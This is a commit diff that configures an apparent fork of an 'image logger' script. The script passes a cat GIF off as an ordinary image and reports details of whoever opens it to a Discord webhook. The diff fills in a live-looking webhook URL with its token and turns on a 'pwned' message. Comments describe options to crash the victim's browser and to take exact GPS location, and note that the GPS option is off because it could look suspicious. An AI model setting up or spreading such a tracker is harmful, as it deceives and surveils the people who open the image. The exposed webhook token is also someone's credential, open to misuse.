51a4ec36e30541c775dab00f41f9920866e79c31
dxrkyv <elvingsson1@gmail.com>
2024-06-16 15:05:26 +0200

    Add files via upload

--- main.py
+++ main.py
@@ -12,14 +12,14 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1251879979143139348/j4FjYGdrYQrSIIW-suhGYCqbH45Ymlr_XoqdLztdos-Jyu_45UF2w4HHr0mJzRGbrHY7",
+    "image": "https://media.tenor.com/StMcxdC56MMAAAAM/cat.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Darks Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x9b59b6, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "This browser got pwned by dark :D", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
